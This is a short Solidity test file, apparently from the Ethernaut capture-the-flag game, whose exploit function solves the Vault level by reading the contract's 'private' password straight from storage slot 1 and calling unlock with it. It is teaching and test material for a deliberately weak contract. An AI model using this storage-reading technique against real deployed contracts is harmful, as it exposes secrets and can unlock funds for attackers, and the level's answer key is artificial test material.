// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Vault} from "../levels/Vault/Vault.sol";
import {VaultFactory} from "../levels/Vault/VaultFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract VaultTest is LevelTest {
    Vault private level;

    constructor() {
        levelFactory = new VaultFactory();
    }

    function testVault() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = Vault(levelAddress);
    }

    function exploit() internal override {
        vm.startPrank(player);
        bytes32 password = vm.load(address(level), bytes32(uint256(1)));
        level.unlock(password);
        vm.stopPrank();
    }
}
